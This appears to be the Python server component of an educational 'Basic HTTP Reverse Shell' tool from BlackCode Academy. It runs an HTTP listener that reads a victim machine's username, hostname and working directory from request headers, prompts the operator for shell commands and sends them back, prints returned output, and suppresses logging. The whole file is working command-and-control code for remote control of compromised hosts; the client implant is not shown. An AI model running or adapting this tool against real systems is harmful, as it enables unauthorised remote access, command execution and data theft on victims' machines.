#!/usr/bin/env python3
# https://github.com/EONRaider/BCA-Basic-HTTP-Reverse-Shell

__author__ = "EONRaider @ keybase.io/eonraider"

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

from src.server import routes


class ShellHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        shell_prompt = f"{self.headers.get('username')}" \
                       f"@{self.headers.get('hostname')}" \
                       f":{self.headers.get('cwd')}$ "
        command = input(shell_prompt)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(command.encode())

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        request_body: dict = parse_qs(self.rfile.read(length).decode())
        if (route := self.path.lstrip("/")) in routes.server_routes:
            getattr(routes, route)(request_body)
        else:
            print(*request_body.get("contents", ""), end="")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args, **kwargs):
        """Suppress output of log messages."""
        pass


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description="Basic HTTP Reverse Shell Server by BlackCode Academy")
    parser.add_argument("host",
                        type=str,
                        help="Server address or hostname.")
    parser.add_argument("-p", "--port",
                        type=int,
                        default=8080,
                        help="Port number to bind the server to.")
    _args = parser.parse_args()

    server_sock = _args.host, _args.port

    with HTTPServer(server_sock, ShellHandler) as server:
        try:
            print('[>>>] Server started on http://{}:{}'.format(*server_sock))
            server.serve_forever()
        except KeyboardInterrupt:
            print('\n[!] Shutting down the server...')
